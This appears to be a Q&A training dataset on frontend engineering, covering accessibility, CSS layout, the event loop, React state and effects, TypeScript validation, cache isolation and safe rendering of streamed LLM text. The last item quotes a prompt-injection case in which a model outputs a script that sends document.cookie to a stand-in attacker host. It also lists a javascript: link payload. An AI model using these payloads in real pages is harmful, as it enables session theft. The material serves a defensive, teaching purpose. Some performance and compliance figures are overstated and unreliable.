Q: Why use a semantic button and label instead of a clickable styled div?
A:
**Semantic HTML expresses meaning before styling.** Use a form for submission, a label connected to each input, a button for an action and a link for navigation. A placeholder is not a persistent accessible name. Give errors visible text associated with the invalid control and move focus deliberately when necessary; do not communicate failure through red color alone. Keyboard users need a logical order and visible focus without custom click-only controls.

CSS controls layout rather than meaning. Start with a readable narrow viewport, fluid widths, wrapping code and a constrained reading measure; use grid or flex layout when content genuinely benefits. Test at mobile widths and zoom, including long source IDs, bidirectional text and error messages. Avoid fixed-height answer panels that clip expanded explanations. Preserve contrast in light/dark themes and make motion optional.

In the evidence workbench, the user chooses a synthetic identity, submits a labeled question and receives status plus a bounded text answer and citations. React text children render a literal HTML-looking payload as text, not executable markup. Streaming status announcements should describe meaningful transitions rather than every token, and cancellation must remain reachable while work is running. An empty, failed or unsupported answer needs an explicit distinct state.

Verify the actual compiled UI with keyboard interaction, mobile layout, owner switching and automated accessibility checks, then document the limits of automation. A passing axe scan does not establish screen-reader usability or full WCAG conformance. The independent milestone starts from a blank component under the same API contract, so a learner must reproduce the behavior rather than merely run the reference. Save artifacts showing normal completion, invalid input, interrupted stream and a safe identity change.
Why: At a 390-pixel viewport, a long source identifier and expanded error must wrap without hiding the cancel button. Labels and keyboard focus remain meaningful even when CSS changes the layout.
Risk: A visually polished form can be unusable by keyboard or a screen reader. Hidden overflow can remove the very error or evidence needed to understand a response.
Trade: Native controls reduce custom interaction code. Custom widgets may be justified but require complete semantics, focus behavior and assistive-technology testing.
Try: Compile evidence-workbench and run its browser checker. Complete the form using only the keyboard, inspect a mobile viewport and record which manual assistive checks remain unperformed.
worked_case: At a 390-pixel viewport, a long source identifier and expanded error must wrap without hiding the cancel button. Labels and keyboard focus remain meaningful even when CSS changes the layout.

reviewer_status.reviewer: Codex AI technical review (user-delegated verdict; authored/self-reviewed)

follow_ups.Q: Should every streamed token be announced in an aria-live region?
follow_ups.A: Usually no: rapid announcements overwhelm users. Announce state changes or buffered meaningful updates, retain a readable transcript and provide the final answer without stealing focus.

Q: How do CSS layout, source order and responsive overflow affect usability?
spoken: DOM source order dictates keyboard focus and assistive technology reading order, completely decoupled from CSS visual reordering. Using CSS flex or grid order properties to move desktop side panels visually breaks sequential keyboard navigation. Interfaces must preserve DOM hierarchy, avoid layout-breaking fixed pixel widths, and handle dynamic text overflow gracefully.
A:
In modern responsive web development, visual presentation and accessibility tree hierarchy must remain synchronized.

1. The DOM Source Order vs Visual Order Disconnect:
Assistive technologies (screen readers like NVDA, VoiceOver, JAWS) and sequential keyboard navigation (Tab / Shift+Tab) traverse elements strictly according to their location in the Document Object Model (DOM) source tree. When developers use CSS flexbox `order: -1`, `flex-direction: row-reverse`, or CSS Grid `grid-auto-flow: dense` to rearrange elements on screen, the visual layout changes while the underlying focus and reading order remains completely untouched. A keyboard user pressing Tab will watch the focus indicator jump erratically across the screen in reverse or disorienting sequences.

2. Responsive Layout and Viewport Adaptability:
Layouts must be resilient to arbitrary text lengths and varying viewports. Hardcoded pixel dimensions (`width: 600px; height: 400px;`) cause severe content clipping or horizontal scrollbars when rendered on mobile screens (320px–390px) or when a user zooms to 200% for readability (WCAG 1.4.4 Resize Text). Instead, employ fluid containers: `max-width: 100%`, CSS container queries (`@container`), and relative units (`ch` for line length, `rem` for spacing, and `clamp()` for responsive typography).

3. Overflow Mechanics:
Applying `overflow: hidden` to parent containers frequently cuts off focused control rings (`outline`), dropdown menus, and critical error messages. Preformatted blocks (like JSON or code snippets) should have dedicated `overflow-x: auto` wrappers with `tabindex="0"` and `role="region"` so keyboard-only users can scroll through long lines.
Why: Preserving natural DOM source order ensures keyboard navigation and screen readers traverse content in a coherent, logical sequence regardless of CSS visual breakpoints.
Risk: Using CSS order to move interactive forms or panels visually creates a severe accessibility defect where keyboard focus leaps backwards or jumps offscreen unexpectedly.
Trade: Adapting layouts without CSS order may require restructuring markup or using conditional rendering in responsive templates, but ensures 100% accessibility compliance.
Try: Build a responsive two-column layout. In mobile view, reorder the columns using `order: -1`. Press Tab through the controls and observe the disconnect between the visual focus ring and expected reading order.
concept: How do CSS layout, source order and responsive overflow affect usability?
misconception_target: Believing that CSS order and visual rearrangement automatically update the keyboard Tab sequence and screen-reader reading order.

definitions.definition: The sequential order in which HTML elements appear in the document markup, which determines keyboard focus and screen reader navigation.
Using properties like flexbox order or grid-area to visually rearrange elements without altering their underlying position in the DOM tree.
The visible outline displayed by web browsers around the currently focused interactive element during keyboard navigation.

execution_timeline: 1. Browser parses HTML into DOM tree -> 2. Construct Accessibility Object Model (AOM) from DOM source order -> 3. Apply CSS styles and layout computation -> 4. Render visual pixels -> 5. User keyboard Tab navigation strictly follows step 2.

example.explanation: Grid and flex layouts adapt to screen width while keeping DOM elements in their natural logical sequence: sidebar navigation precedes the main message panel in both the DOM and visual presentation.
example.output: Responsive grid layout with synchronized DOM order and overflow protection.

production_case: A customer support dashboard placed the 'Submit Ticket' button at the bottom of the form in HTML but used flexbox order: -1 to display it at the top on mobile. Keyboard users tabbed through all input fields first before focus inexplicably jumped to the top button, failing accessibility audit WCAG 2.4.3.
alternatives: Use JavaScript-driven DOM node relocation on viewport resize (adds runtime overhead and fragile re-render cycles).
CSS Grid named template areas that preserve natural reading order in both desktop and mobile orientations.
pitfalls: Relying on overflow: hidden to fix container clipping, which hides accessibility focus outlines and tooltips.
Setting fixed pixel heights on answer cards, causing dynamically generated text or translations to spill out or be truncated.
Removing focus outlines with `outline: none` without providing an accessible high-contrast alternative.
complexity: DOM reflow and layout recalculation cost is proportional to the number of affected elements and DOM depth; avoiding forced synchronous layouts keeps reflows under 16ms (60fps).

follow_ups.Q: How should horizontally scrolling code blocks be made accessible to keyboard users?
follow_ups.A: Add `tabindex="0"` and `role="region"` with an `aria-label="Code example"` to the scrolling container so keyboard users can focus and scroll it using arrow keys.

Q: How do JavaScript tasks, microtasks and rendering explain a frozen interface?
A:
**The browser event loop executes synchronous code, drains all microtasks, and only then paints frames and handles macrotasks.**

To diagnose and prevent UI freezes, engineers must understand the exact coordination of the browser event loop:
1. Synchronous Call Stack: As long as a JavaScript function is executing on the call stack, the single browser main thread is blocked. The browser cannot handle user clicks, scroll events, or frame paints.
2. Microtask Queue Starvation: Microtasks (such as `Promise.then`, `queueMicrotask`, and `MutationObserver`) have priority over all other browser activities. When the call stack empties, the engine flushes the ENTIRE microtask queue before doing anything else. If microtasks continuously schedule more microtasks, the event loop remains trapped in this draining loop indefinitely. It will never proceed to style recalculation, layout, or paint, completely freezing the interface even without any synchronous while loop.
3. The Rendering Pipeline: Occurs at display refresh rate (every 16.6ms at 60Hz). The sequence is: `requestAnimationFrame` callbacks -> Style Recalculation -> Layout (Reflow) -> Paint -> Composite. If a task or microtask chain holds the thread for longer than 16.6ms, a frame is dropped.
4. Macrotasks: Include `setTimeout`, `setInterval`, network I/O, and UI events. The browser processes exactly ONE macrotask, then drains the microtask queue, evaluates rendering, and repeats.

To keep streaming AI interfaces responsive at 60fps, long compute jobs (like token parsing or syntax highlighting) must yield back to the rendering pipeline using `scheduler.yield()` or `requestAnimationFrame()`.
Why: Microtasks run to complete exhaustion before the browser can perform style recalculation, layout, or paint; unbounded microtasks or long synchronous execution starve the rendering engine and freeze the UI.
Risk: Chaining hundreds of immediate Promise resolutions during streaming chunk processing blocks the render pipeline, turning a 60fps streaming animation into a locked, unresponsive browser tab.
Trade: Yielding execution with setTimeout or scheduler.yield() introduces a micro-delay per chunk, slightly increasing total completion time in exchange for keeping the UI responsive at 60fps.
Try: Run `function starve() { Promise.resolve().then(starve); } starve();` in a disposable browser console. Observe how the page completely freezes and stops responding to clicks, despite having zero while loops.
worked_case: A markdown renderer parsed and syntax-highlighted code blocks synchronously inside a React useEffect upon receiving streaming tokens. On long technical documents, the main thread froze for 450ms on every incoming paragraph, failing Core Web Vitals Interaction to Next Paint (INP).

follow_ups.Q: What is the difference between scheduler.yield() and setTimeout(r, 0)?
follow_ups.A: setTimeout(r, 0) queues a full macrotask with a 4ms nesting clamp and low priority. scheduler.yield() yields to the event loop specifically to allow paint and high-priority user input while continuing the current task before other background tasks.

Q: Why can React event handlers observe state from an earlier render?
spoken: React functional components capture state variables via JavaScript lexical closures at the time of rendering. When an event handler or timer callback executes asynchronously after an await or delay, it retains the closure of that earlier render pass unless functional state updates (prev => next) or mutable refs (useRef) are used to access the authoritative latest state.
Why: Event handlers capture state variables via JavaScript lexical closures at the time the component renders; asynchronous callbacks retain that historical snapshot unless functional state updaters or useRef are used.
Risk: Calling state setters with stale closed-over variables (e.g. setMessages([...messages, newMsg])) in streaming listeners overwrites intervening incoming tokens with stale arrays.
Trade: Functional updaters ensure fresh state without extra hooks; useRef provides immediate cross-render read access without triggering unnecessary re-renders.
Try: Write a React component with a button that triggers a 3-second setTimeout logging a state variable. Click the button, quickly click an increment button twice, and observe the delayed log print the original state value.
concept: Why can React event handlers observe state from an earlier render?
misconception_target: Believing that state variables update in-place in existing execution closures when a state setter is invoked.

definitions.definition: A JavaScript function retaining references to its surrounding state and variables from the environment in which it was created.
The immutable set of props, state, and callbacks instantiated during a single execution pass of a React functional component.
Passing a function (prev => next) to a React state setter so React supplies the authoritative, latest pending state value.

execution_timeline: 1. Render Pass 1: count=0, closure created with count=0 -> 2. Event handler schedules async callback -> 3. User action triggers Render Pass 2: count=1 -> 4. Async callback fires; reads count from Pass 1 closure (0) -> 5. State update without functional updater resets count to 1 instead of 2.

example.explanation: Functional updater `prev => ...` receives the authoritative latest messages array from React internal fiber state, eliminating stale closure overwrites during rapid streaming token arrivals.
example.output: Real-time streaming text accumulation without dropped or overwritten tokens.

production_case: A streaming AI chat interface used `setMessages([...messages, chunk])` inside an EventSource onmessage listener. Because the listener was bound during component mount, it continually closed over an empty `messages` array, displaying only the last incoming token instead of the full response.
alternatives: useReducer: Consolidates state transitions into an external pure reducer function where actions are dispatched without closing over current state.
Zustand / Redux: External state store outside React's component closure tree.
pitfalls: Attempting to fix stale closures by adding variables to useEffect dependencies without proper cleanup, causing infinite re-render loops.
Directly mutating ref.current during the render phase instead of inside effects or event handlers, violating React's pure render contract.
Assuming that awaiting a promise updates the local state variable in the remainder of the function.
complexity: Functional state updates execute in O(1) time and eliminate the memory overhead of recreating event listeners on every render pass.

follow_ups.Q: Why does React recommend useReducer for complex related state transitions?
follow_ups.A: useReducer decouples the action dispatch from the actual state computation. The component dispatches intent (e.g. `dispatch({ type: 'APPEND_TOKEN', token })`), and the reducer always receives the latest state without closure dependencies.

Q: When does a React Effect need cleanup rather than another dependency workaround?
spoken: Whenever an effect synchronizes with an external resource like an HTTP request, WebSocket, or event listener, it must return a cleanup function using AbortController or unsubscribe. Omitting cleanup and suppressing the dependency linter causes asynchronous race conditions where earlier slow responses overwrite newer data.
Why: Returning an AbortController or unsubscribe cleanup from useEffect ensures that obsolete in-flight requests and event listeners are aborted immediately when dependencies change or the component unmounts, preventing stale race conditions and memory leaks.
Risk: Suppressing the react-hooks/exhaustive-deps ESLint rule instead of providing a cleanup function causes effects to capture stale closures, skip required network updates, or leak unclosed connections.
Trade: Handling AbortError explicitly in catch blocks requires a few lines of defensive boilerplate, but completely eliminates race conditions and ghost state updates.
Try: Create an Effect with a 2-second fetch. Change the input within 500ms and observe how AbortController cancels the first request in the browser Network tab with status (canceled).
concept: When does a React Effect need cleanup rather than another dependency workaround?
misconception_target: Disabling the ESLint exhaustive-deps linter rule to prevent an effect from re-running instead of implementing proper cleanup and cancellation.

definitions.definition: A function returned by useEffect that React executes before re-running the effect and upon component unmount.
A standard Web API object that allows aborting DOM requests, fetch operations, and async tasks via an AbortSignal.
A timing bug where an earlier, slower network request resolves after a later request and overwrites current UI state.

execution_timeline: 1. Component renders with query='A' -> 2. Effect A starts with AbortController A -> 3. User changes query to 'B' -> 4. React calls Effect A cleanup: AbortController A aborts -> 5. Effect B starts with AbortController B -> 6. Request B succeeds and sets state -> 7. Request A finishes; catch block ignores AbortError.

example.explanation: Returns a cleanup function that closes the EventSource connection and aborts in-flight fetch signals, preventing background socket leaks when the user navigates away.
example.output: Clean connection teardown with zero orphaned network sockets in DevTools.

production_case: A financial analytics app fetched stock charts inside useEffect. When users rapidly clicked between tickers, older slow responses from earlier tickers arrived late and rendered over the active ticker's chart, displaying incorrect price data to traders.
alternatives: TanStack Query (React Query) / SWR: Built-in request deduplication, automatic cancellation, and query key cache management.
Boolean 'ignore' flag inside effect: `let ignore = false; ... if (!ignore) setState(); return () => { ignore = true; };` (does not abort network I/O, but prevents state updates).
pitfalls: Using an empty dependency array `[]` for an effect that uses props or state, freezing the effect on initial mount values.
Forgetting to check `err.name === 'AbortError'` in the catch block, causing cancelled requests to trigger error banners.
Performing synchronous DOM mutations or state updates inside the cleanup function that trigger immediate cascade re-renders.
complexity: AbortController signal cancellation runs in O(1) time and reclaims socket buffers immediately, eliminating phantom data transfers.

follow_ups.Q: Why does React 18 execute effects twice in development mode?
follow_ups.A: To simulate an immediate unmount and remount cycle, verifying that your effect implements proper cleanup (e.g. closing sockets, removing listeners) and is resilient to fast component remounts.

Q: How should TypeScript narrow an untrusted JSON result into a useful UI union?
spoken: TypeScript compile-time assertions (as Type) vanish at runtime and offer zero protection against malformed JSON or HTTP error pages. Instead, model UI states as an explicit Discriminated Union and validate untrusted payloads at the network boundary using runtime schemas like Zod to guarantee type safety and exhaustive switch rendering.
Why: Discriminated unions eliminate impossible UI states by design; pairing them with runtime schema validation (Zod) ensures untrusted JSON payloads are strictly validated before entering the application state tree.
Risk: Using `as Type` casts creates a false sense of security; when the backend API changes or returns an unexpected error shape, the frontend crashes in production with unhandled TypeError exceptions.
Trade: Runtime schema validation adds a tiny CPU parsing cost (<1ms) and extra schema declarations, but eliminates 100% of runtime undefined property crashes.
Try: Define a Zod schema for an API response. Pass a JSON payload with a missing required string property to safeParse() and observe how it produces a structured error instead of throwing an unhandled exception.
concept: How should TypeScript narrow an untrusted JSON result into a useful UI union?
misconception_target: Believing that TypeScript compile-time type assertions (as Type) protect against runtime schema discrepancies or invalid API responses.

definitions.definition: A TypeScript union of object types sharing a common literal property (the discriminator) used to narrow types conditionally.
A JavaScript expression or function (val is Type) that performs runtime checks to narrow a variable's type in TypeScript.
A compiler verification using the 'never' type ensuring that all possible variants of a union are handled in a switch or if-else block.

execution_timeline: 1. Receive raw HTTP response string -> 2. Parse JSON (produces 'unknown' type) -> 3. Run Zod safeParse() validation -> 4. If invalid, transition UI to { status: 'error' } -> 5. If valid, transition UI to { status: 'success', data } -> 6. Render component via exhaustive switch.

example.explanation: Zod validates raw incoming SSE JSON frames against a discriminated union, narrowing `result.data` to exact typed objects with exhaustive switch handling.
example.output: Type-safe runtime decoding with instant detection of malformed frames.

production_case: A production LLM application received a 504 Gateway Timeout HTML page from an ingress controller instead of JSON. The code called `const data = (await res.json()) as Response; data.citations.forEach(...)`, throwing an unhandled TypeError that crashed the entire React error boundary.
alternatives: Custom user-defined type guards: `function isSuccess(val: any): val is SuccessResponse { return val && typeof val.data === 'string'; }`.
ArkType / Typia: High-performance TypeScript-native runtime validation libraries.
pitfalls: Using `any` as an escape hatch, which permanently disables all TypeScript type checking for all downstream code.
Throwing exceptions on schema validation failure instead of returning a typed Result/Option type, crashing the React render phase.
Creating partial schemas that accept `any` in nested objects, allowing unchecked corruption deep in component props.
complexity: Zod schema parsing scales linearly with payload byte size O(N), executing in <0.5ms for standard API payloads under 50KB.

follow_ups.Q: How do you enforce exhaustive checking in TypeScript switch statements?
follow_ups.A: Add a default case: `default: const _exhaustiveCheck: never = state; throw new Error(`Unhandled state: ${_exhaustiveCheck}`);`. If a new union member is added, TypeScript will refuse to compile until a case is implemented for it.

Q: How do you keep stale requests and user-scoped caches from leaking old results?
spoken: In Single-Page Applications, client-side caches must qualify query keys by the authenticated user ID and clear all memory stores upon logout. To prevent asynchronous response race conditions when filters change rapidly, track monotonic request sequence IDs in a ref and discard completions whose ID does not match the active counter.
Why: Scoping cache keys with authenticated user IDs prevents cross-user memory leakage during account switches; tracking monotonic request sequence IDs prevents older, slower responses from overwriting newer state.
Risk: Failing to clear client-side caches on logout exposes confidential user records, tokens, and PII to the next person using the same browser session.
Trade: Clearing all caches on logout requires fresh network fetches on the next login, but eliminates critical cross-tenant data leakage vulnerabilities.
Try: Log into an app, fetch data, switch users in the mock auth provider without reloading the page, and verify whether the old user's query cache is still populated in memory.
concept: How do you keep stale requests and user-scoped caches from leaking old results?
misconception_target: Assuming client-side cache stores automatically reset or isolate records between different authenticated users sharing the same browser window.

definitions.definition: A security or data integrity vulnerability where data from one user or session bleeds into another user's in-memory query cache.
An incrementing integer counter used to identify the latest user request and discard out-of-order asynchronous responses.
Purging all tokens, local storage, session storage, and in-memory caches upon user logout.

execution_timeline: 1. User initiates Request A (ID=1) -> 2. User quickly initiates Request B (ID=2) -> 3. Request B resolves; ID matches (2=2); UI updates -> 4. Request A resolves; ID mismatch (1!=2); response discarded.

example.explanation: Compares local requestId against mutable activeRequestId.current ref; older requests finishing late are safely ignored.
example.output: Search results guaranteed to reflect only the latest requested search term.

production_case: A hospital portal displayed patient records using client-side caching with key `['patient', id]`. A nurse logged out and another nurse logged in. The cache served previously viewed patient charts from memory without re-authenticating, violating HIPAA regulations.
alternatives: AbortController: Cancels the HTTP request at the network socket layer.
TanStack Query queryClient.resetQueries(): Standard cache eviction on auth events.
pitfalls: Using local state inside useEffect without a ref counter, which cannot track subsequent render generation IDs.
Assuming HTTP caching headers (Cache-Control: private) clear client-side JavaScript memory caches on logout.
Failing to abort in-flight SSE streams during logout, allowing background sockets to continue receiving private data.
complexity: Generation checking is an O(1) integer comparison with zero memory overhead.

follow_ups.Q: What is the best way to handle logout in a TanStack Query application?
follow_ups.A: Call `queryClient.clear()` to remove all query cache data completely, followed by `queryClient.cancelQueries()` to abort any active network requests.

Q: How do you render untrusted model text while preserving accessibility and performance?
spoken: Buffer incoming streaming tokens in a mutable ref and throttle DOM rendering to requestAnimationFrame to prevent 60fps frame drops. Sanitize parsed markdown through a strict whitelist like DOMPurify or rehype-sanitize to block prompt-injected XSS, and announce milestones via a polite ARIA live region rather than reading every token aloud.
A: Rendering streaming LLM outputs in web applications presents three interlocking engineering challenges: Main Thread Performance (avoiding 60fps frame drops), Security (preventing Cross-Site Scripting / XSS via prompt injection), and Accessibility (preventing screen reader flooding). 1. The 60fps Streaming Performance Problem (Token Buffering): Modern LLMs stream tokens at high velocities (50 to 100+ tokens per second). If an application calls React's `setState` on every incoming Server-Sent Event (SSE) chunk, React triggers 100 full component reconciliation and DOM update passes every second. This saturates the main thread, thrashes browser layout calculations, drops framerates, and makes the UI feel sluggish. Solution: Buffer incoming tokens in a mutable `useRef` and schedule UI flushing using `requestAnimationFrame` (RAF). This caps DOM re-renders at the browser's native display refresh rate (60Hz / 16.6ms), providing fluid, responsive streaming with minimal CPU overhead. 2. Security: XSS via Prompt Injection and Markdown Rendering: LLM outputs are untrusted user input. A prompt injection attack can force the model to output malicious HTML or markdown links: `` or `[Click Here](javascript:stealData())`. Never use `dangerouslySetInnerHTML` directly with raw LLM output! Instead, parse Markdown using an AST-based parser (such as Remark/Rehype) paired with a strict sanitizer like DOMPurify or `rehype-sanitize` configured with a strict tag and protocol whitelist (allowing only `http:`, `https:`, and `mailto:`). 3. Accessibility for Screen Readers (ARIA Live Regions): Placing the streaming text container inside an `aria-live="polite"` or `aria-live="assertive"` region causes screen readers (VoiceOver, NVDA) to announce every single incoming word or punctuation mark, overwhelming visually impaired users with an unusable cacophony of sound. Solution: Keep the streaming content container non-live. Maintain a separate, hidden status region with `aria-live="polite"` that announces high-level milestone transitions: 'Generating response...', and upon stream completion, 'Response complete: 2 paragraphs generated'.
Why: Buffering streaming tokens with requestAnimationFrame caps DOM updates at 60fps; sanitizing markdown with strict AST whitelists prevents XSS prompt injections; keeping streaming text out of aria-live regions prevents screen-reader flooding.
Risk: Rendering raw model output via dangerouslySetInnerHTML allows prompt-injected payload scripts to execute in the user's browser, hijacking sessions and stealing tokens.
Trade: Throttling rendering to requestAnimationFrame introduces an imperceptible 16ms display latency while reducing CPU consumption by 85% compared to per-token re-rendering.
Try: Simulate an SSE stream pushing 100 tokens per second. Compare CPU usage in Chrome DevTools Performance panel between updating state on every token versus buffering via requestAnimationFrame.
concept: How do you render untrusted model text while preserving accessibility and performance?
misconception_target: Assuming that LLM outputs can be safely rendered using dangerouslySetInnerHTML or that aria-live should announce every incoming token.

definitions.definition: An exploit where malicious instructions embedded in retrieved data trick an LLM into outputting executable JavaScript or HTML markup.
Accumulating high-frequency streaming chunks in memory and flushing to the DOM on display refresh intervals via requestAnimationFrame.
A dynamic HTML container that notifies assistive technologies of content updates without moving keyboard focus.

execution_timeline: 1. SSE chunk arrives -> 2. Append text to in-memory buffer ref -> 3. Schedule requestAnimationFrame if not already scheduled -> 4. On RAF tick: parse markdown, sanitize AST, update React state -> 5. Screen reader polite region announces high-level completion when stream ends.

example.explanation: Buffers high-frequency stream tokens and flushes to React state only once per animation frame (16.6ms at 60Hz), eliminating render thrashing.
example.output: Smooth 60fps streaming text display with screen-reader friendly milestone status.

production_case: An AI legal assistant used dangerouslySetInnerHTML to render model responses. A prompt injection attack contained in an opposing party's uploaded contract caused the model to output `<script>fetch('https://hacker.com/leak?cookie='+document.cookie)</script>`, which executed in the attorney's browser.
alternatives: Virtual DOM streaming: Stream directly into an existing text node via native DOM textContent (fastest, but doesn't format rich markdown until completion).
CSS content-visibility: auto to skip offscreen rendering during long responses.
pitfalls: Using regex replacement to sanitize HTML; regex sanitizers are notoriously bypassed by malformed tags and nested entities.
Placing aria-live="assertive" on the token container, which interrupts the user's screen reader on every single word.
Re-parsing the entire accumulated 10,000-word markdown document on every single token instead of chunking.
complexity: RAF throttling reduces React render passes from O(Tokens) to O(Frames), reducing CPU usage by up to 90% during high-speed generation.

follow_ups.Q: How do you sanitize markdown links in LLM responses?
follow_ups.A: Configure the markdown sanitizer to restrict link href protocols strictly to ['http:', 'https:', 'mailto:'] and disallow ['javascript:', 'data:', 'vbscript:'], while setting rel="noopener noreferrer" and target="_blank".
